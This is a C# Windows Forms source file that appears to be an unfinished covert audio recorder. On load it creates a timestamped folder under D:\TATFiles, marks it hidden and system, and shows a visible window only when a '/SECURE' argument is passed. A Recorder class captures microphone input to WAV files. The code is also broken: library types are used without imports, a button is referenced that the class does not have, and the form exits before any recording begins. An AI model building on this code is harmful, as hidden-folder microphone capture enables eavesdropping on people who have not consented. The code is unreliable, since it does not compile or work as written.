using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace withness04
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        bool Hooking = true;

        [System.Runtime.InteropServices.DllImport("kernel32")]
        private static extern int Sleep(int dwTime);

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        private void Form1_Load(object sender, EventArgs e)
        {

            foreach (string Arg in Environment.GetCommandLineArgs())
            {
                if (Arg == Environment.CommandLine.Replace("\"", "") || Arg == System.IO.Path.GetFileName(Environment.CommandLine.Replace("\"", "")))
                    continue;
                if (Arg.StartsWith("/SECURE")) { this.Opacity = .9; this.ShowInTaskbar = true; Hooking = false; }
            }
            if (Hooking)
            {
                string Ty = DateTime.Now.ToString().Replace('/', '-').Replace(':', '-');

                if (!(Directory.Exists(@"D:\TATFiles")))
                    Directory.CreateDirectory(@"D:\TATFiles");
                File.SetAttributes(@"D:\TATFiles", FileAttributes.Hidden | FileAttributes.System);

                if (!(Directory.Exists(@"D:\TATFiles\" + Ty)))
                    Directory.CreateDirectory(@"D:\TATFiles\" + Ty);
                File.SetAttributes(@"D:\TATFiles\" + Ty, FileAttributes.Hidden | FileAttributes.System);

                Application.Exit();

            }
        }


    }


    public class Recorder
    {

        WaveIn sourceStream;
        WaveFileWriter waveWriter;
        readonly String FilePath;
        readonly String FileName;
        readonly int InputDeviceIndex;

        public Recorder(int inputDeviceIndex, String filePath, String fileName)
        {
            this.InputDeviceIndex = inputDeviceIndex;
            this.FileName = fileName;
            this.FilePath = filePath;
        }

        public void StartRecording(object sender, EventArgs e)
        {
            sourceStream = new WaveIn
            {
                DeviceNumber = this.InputDeviceIndex,
                WaveFormat =
                    new WaveFormat(44100, WaveIn.GetCapabilities(this.InputDeviceIndex).Channels)
            };

            sourceStream.DataAvailable += this.SourceStreamDataAvailable;

            if (!Directory.Exists(FilePath))
            {
                Directory.CreateDirectory(FilePath);
            }

            waveWriter = new WaveFileWriter(FilePath + FileName, sourceStream.WaveFormat);
            sourceStream.StartRecording();
        }

        public void SourceStreamDataAvailable(object sender, WaveInEventArgs e)
        {
            if (waveWriter == null) return;
            waveWriter.Write(e.Buffer, 0, e.BytesRecorded);
            waveWriter.Flush();
        }

        private void RecordEnd(object sender, EventArgs e)
        {
            if (sourceStream != null)
            {
                sourceStream.StopRecording();
                sourceStream.Dispose();
                sourceStream = null;
            }
            if (this.waveWriter == null)
            {
                return;
            }
            this.waveWriter.Dispose();
            this.waveWriter = null;
            recordEndButton.Enabled = false;
            Application.Exit();
            Environment.Exit(0);
        }
    }
}
